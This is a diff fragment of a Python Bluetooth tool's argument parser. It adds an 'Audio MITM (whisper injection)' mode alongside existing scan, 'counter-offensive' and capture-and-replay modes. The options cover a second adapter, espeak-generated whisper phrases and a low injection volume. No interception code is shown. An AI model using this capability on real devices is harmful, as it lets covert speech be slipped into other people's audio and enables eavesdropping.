         required=True,
-        choices=["1", "2", "3"],
-        help="1 = Scan & whitelist  |  2 = Monitor & counter-offensive  |  3 = Capture & replay",
+        choices=["1", "2", "3", "4"],
+        help="1 = Scan & whitelist  |  2 = Monitor & counter-offensive\n3 = Capture & replay  |  4 = Audio MITM (whisper injection)",
     )
     parser.add_argument(
         "-c", "--config",
@@ -1311,15 +2195,47 @@ if __name__ == "__main__":
         action="store_true",
         help="Disable BLE scanning (classic BT only)",
     )
+    parser.add_argument(
+        "-o",
+        dest="interface2",
+        default=None,
+        help="Second BT adapter for mode 4 MITM (e.g. hci1)",
+    )
+    parser.add_argument(
+        "-w", "--whispers-dir",
+        default=None,
+        help="Directory containing .wav whisper files (mode 4)",
+    )
+    parser.add_argument(
+        "-f",
+        "--f",
+        dest="whispers_text",
+        default=None,
+        help="Text file with words/phrases (one per line) to generate whisper WAVs via espeak (mode 4)",
+    )
+    parser.add_argument(
+        "--whisper-volume",
+        type=float,
+        default=0.15,
+        help="Whisper injection volume 0.0-1.0 (mode 4, default: 0.15)",
+    )
+    parser.add_argument(
+        "-l", "--whisper-lang",
+        default="en",
+        help="Espeak language code for TTS generation (mode 4, default: en). Examples: fr, de, es, it, pt, ru, zh, ja",
+    )
 
     args = parser.parse_args()
     print(colored(banner_intro, "cyan"))
 
-    iface = load_config(args.config)
+    iface, conf_lang = load_config(args.config)
     check_interface(iface)
 
     mode = int(args.mode)
     include_ble = not args.no_ble
+
+    # CLI --whisper-lang overrides config file; fallback to "en"
+    whisper_lang = args.whisper_lang if args.whisper_lang != "en" else (conf_lang or "en")
 
     if mode == 1:
         mode_scan_whitelist(iface, scan_time=args.scan_time, include_ble=include_ble)
@@ -1327,3 +2243,7 @@ if __name__ == "__main__":
         mode_monitor(iface, include_ble=include_ble)
     elif mode == 3:
         mode_replay(iface, include_ble=include_ble, replay_count=args.replay_count)
+    elif mode == 4:
+        mode_whisper(iface, args.interface2, args.whispers_dir,
+                     whisper_volume=args.whisper_volume, include_ble=include_ble,
+                     whispers_text=args.whispers_text, whisper_lang=whisper_lang)
